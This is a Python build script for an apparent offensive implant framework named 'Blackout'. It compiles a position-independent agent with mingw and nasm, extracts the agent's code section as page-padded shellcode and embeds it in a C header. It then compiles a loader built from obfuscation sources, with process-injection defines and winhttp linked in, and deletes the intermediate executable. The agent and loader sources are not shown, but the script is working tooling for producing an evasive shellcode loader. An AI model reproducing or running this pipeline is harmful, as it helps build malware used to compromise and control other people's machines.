import argparse
import os
import subprocess
import glob
import pefile

# Constants
BLACKOUT_END: bytes = b'BLACKOUT-END'
PAGE_SIZE: int = 0x1000

def clean_bin_folder():
    """Deletes all .exe and .bin files in the bin folder before compilation."""
    for file in glob.glob("bin/*.exe") + glob.glob("bin/*.bin"):
        try:
            os.remove(file)
            print(f"Removed {file}")
        except OSError as e:
            print(f"Error removing {file}: {e}")

def size_to_pages(size: int) -> int:
    """Calculates the number of pages needed for the given size."""
    PAGE_MASK = 0xfff
    BASE_PAGE_SHIFT = 12
    return (size >> BASE_PAGE_SHIFT) + ((size & PAGE_MASK) != 0)

def extract_shellcode():
    """Extracts shellcode from the PE file and saves it as a binary file."""
    executable = pefile.PE("./bin/blackout.x64.exe")
    shellcode = bytearray(executable.sections[0].get_data())
    shellcode = shellcode[:shellcode.find(BLACKOUT_END)]
    
    size = len(shellcode)
    
    pages = size_to_pages(size)
    padding = (pages * PAGE_SIZE) - size

    for i in range(padding):
        shellcode.append(0)

    size = len(shellcode)
    print(f"[*] payload len : {size - padding} bytes")
    print(f"[*] size        : {size} bytes")
    print(f"[*] padding     : {padding} bytes")
    print(f"[*] page count  : {size / PAGE_SIZE} pages")

    with open("bin/blackout.x64.bin", 'wb+') as file:
        file.write(shellcode)

def generate_shellcode_header(bin_path, output_path, section):
    """Generates a C header file with shellcode and its size."""
    attribute = f"__attribute__(( section(\".{section}\") ))" if section else ""
    
    with open(bin_path, 'rb') as bin_file, open(output_path, 'w') as c_file:
        data = bin_file.read()
        c_file.write(f'{attribute} unsigned char BlackoutBytes[] = {{\n')

        for i in range(0, len(data), 12):
            line = ', '.join(f'0x{byte:02X}' for byte in data[i:i + 12])
            c_file.write(f'    {line},\n')

        c_file.write(f'}};\n\nunsigned int BlackoutSize = {len(data)};\n')
    
    print(f'Generated shellcode header in {output_path}.')

def compile_loader(injection_defines, ldr_output):
    """Compiles the loader from the specified source files."""
    ldr_src = ["./loader/src/*.c", "./loader/src/obfuscation/*.c"]
    src_files = [file for pattern in ldr_src for file in glob.glob(pattern)]

    cx64 = "x86_64-w64-mingw32-gcc"
    cflags = "-nostdlib -mrdrnd -Os -w -s -I loader/include"
    clinks = "-lntdll -lkernel32 -lmsvcrt -lwinhttp -e WinMain"

    if not src_files:
        print(f"No source files found in: {ldr_src}")
        return False

    os.makedirs('./bin', exist_ok=True)
    command = [cx64] + cflags.split() + src_files + clinks.split() + ['-o', ldr_output]

    if injection_defines:
        command += injection_defines.split()

    result = subprocess.run(command)
    if result.returncode == 0:
        print(f"Compilation successful: {ldr_output}")
        return True
    else:
        print("Compilation failed.")
        print(result.stderr)  # Print error output
        return False

def compile_agent(agent_bkapi):
    """Compiles the agent from the source files and assembly code."""
    CFLAGS = "-Os -fno-asynchronous-unwind-tables -nostdlib "
    CFLAGS += "-fno-ident -fpack-struct=8 -falign-functions=1 "
    CFLAGS += "-s -ffunction-sections -Iagent/include -falign-jumps=1 -w -m64 "
    CFLAGS += "-falign-labels=1 -fPIC -Wl,-Tagent/scripts/Linker.ld "
    CFLAGS += "-Wl,-s,--no-seh,--enable-stdcall-fixup "
    CFLAGS += "-masm=intel -fpermissive -mrdrnd "

    if agent_bkapi:
        CFLAGS += f"-D{agent_bkapi} "

    BLACK_SRC = "agent/src/*.c"
    ASM_SRC = "agent/src/asm/blackout.x64.asm"
    ASM_OUTPUT = "bin/agent_obj/asm_blackout.x64.o"

    nasm_command = f"nasm -f win64 {ASM_SRC} -o {ASM_OUTPUT}"
    print(f"Compiling assembly: {nasm_command}")
    nasm_result = subprocess.run(nasm_command, shell=True)

    if nasm_result.returncode != 0:
        print("Assembly compilation failed.")
        print(nasm_result.stderr)
        return False

    src_files = glob.glob(BLACK_SRC)

    if not src_files:
        print("No agent source files found.")
        return False

    os.makedirs('./bin', exist_ok=True)
    agent_output = "bin/blackout.x64.exe"  

    command = f"x86_64-w64-mingw32-g++ {CFLAGS} {ASM_OUTPUT} {' '.join(src_files)} -o {agent_output}"
    print(f"Compiling agent: {command}")
    result = subprocess.run(command, shell=True)

    if result.returncode == 0:
        print(f"Agent compilation successful: {agent_output}")
        return True
    else:
        print("Agent compilation failed.")
        print(result.stderr)
        return False

def main():
    """Main function to handle command line arguments and orchestrate compilation."""
    parser = argparse.ArgumentParser(description="Compile a loader and dump shellcode.")
    parser.add_argument("--output", required=True, help="Specify the output file for the loader.")
    parser.add_argument("--section", help="Define the section for the loader.")
    parser.add_argument("--injection", help="Define injection parameters.")
    parser.add_argument("--agent-bkapi", help="Define agent BKAPI input for the -D option.")

    args = parser.parse_args()
    injection_defines = f"-D {args.injection}" if args.injection else ""
    ldr_output = f"bin/{args.output}"

    clean_bin_folder()

    if compile_agent(args.agent_bkapi):
        extract_shellcode()
        generate_shellcode_header("bin/blackout.x64.bin", "loader/include/shellcode.h", args.section)
        
        compile_loader(injection_defines, ldr_output)
        
        try:
            os.remove("bin/blackout.x64.exe")
            print("Removed blackout.x64.exe after compilation.")
        except OSError as e:
            print(f"Error removing blackout.x64.exe: {e}")

if __name__ == "__main__":
    main()